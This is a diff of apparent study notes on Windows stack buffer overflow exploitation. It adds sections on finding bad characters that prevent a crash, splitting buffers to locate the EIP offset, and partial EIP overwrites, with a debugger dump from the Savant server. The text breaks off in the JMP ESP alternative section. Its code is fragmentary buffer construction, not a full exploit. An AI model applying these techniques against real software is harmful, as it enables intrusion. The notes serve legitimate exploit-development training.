@@ -4,6 +4,10 @@
 
 * 1.0 [Not enough space to test bad characters.](#NES-BC)
 * 2.0 [Not enough spcae to test shellcode.](#NES-Shellcode)
+* 3.0 [Testing Bad Characters doesn't cause a crash.](#NoCrashBC)
+* 4.0 [Unique String Cause Another Crash.](#UniqueStringAnotherCrash)
+* 5.0 [Partial EIP Overwrite.](#PartialEIPOverwrite)
+  * 5.1 [Partial EIP Overwrite - JMP ESP Alternative.](#PEO-Alternative)
 
 ### 1. Not enough space to test bad characters.<a name="NES-BC"></a>
 
@@ -38,3 +42,84 @@ ecx = b"\xff\xe1\x90\x90" # 0xffe1 JMP ECX NOP NOP
 nops = b"\x90" * 10
 ...
 ```
+
+### 3. Testing Bad Characters doesn't cause a crash.<a name="NoCrashBC"></a>
+
+Sometimes, sending our bunch of bad characters to test them doesn't cause a crash. This is most likely the result of a bad character.
+
+```python
+...
+    badchars = (
+        #b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
+        #b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
+        #b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
+        #b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
+        #b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+        #b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
+        #b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
+        #b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
+        #b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
+        #b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
+        b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
+        b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
+        b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
+        b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
+        b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
+        b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
+        b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
+        b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
+        b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
+        b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+        )
+...
+```
+
+To identify it, we simply comment the first half of the badchars variables. If we succesfully overwrite the isntruction pointer, this mean that the bad chars isn't in the last half of the bad chars.
+
+Repeat this process, since you found all bad chars including the one that prevent the vulnerable application from crashing.
+
+### 4. Unique String Cause Another Crash.<a name="UniqueStringAnotherCrash"></a>
+
+Sometimes, running our PoC with the Unique Pattern (or other similar situation), cause a different crah.
+
+When it happen, how to find the exact offset of EIP? To overcome this we can split our buffer in two parts.
+
+```python
+...
+inputBuffer = b"\x41" * 130  
+inputBuffer+= b"\x42" * 130
+...
+```
+
+If the EIP is overwritten by "42424242" that mean the exact offset is present in the second half of our buffer. Split the 42 in two part and repeat the process since finding the exact offset.
+
+### 5. Partial EIP Overwrite.<a name="PartialEIPOverwrite"></a>
+
+Sometimes, we can see that our buffer is null-terminated.
+
+```bash
+0:003> dds @esp L4  
+01fcea2c 00434343 Savant+0x34343 ## 00434343  
+01fcea30 01fcea84  
+01fcea34 0041703c Savant+0x1703c  
+01fcea38 003d5750
+```
+
+When it happen, we can use the Partial EIP overwrite technique.
+
+When our executable is mapped in an address range that start with a null byte, we can use the string null terminator as part of our EIP overwrite to redirect the execution flow to the assembly instruction we choose within the module.
+
+```python
+...
+inputBuffer = b"\x41" * size  
+inputBuffer+= b"\x42\x42\x42"
+...
+```
+
+Run the PoC and our partial EIP overwrite should be a success.
+
+Now we need to decide where we want to redirect the execution flow to.
+
+#### 5.1 Partial EIP Overwrite - JMP ESP Alternative.<a name="PEO-Alternative"></a>
+
+When we use Partial EIP overwrite technique, we cannot store any data past the return address, because the added null byte will terminate the string. As the ESP register will not point ot our buffer we can't use instructions such as JMP ESP.
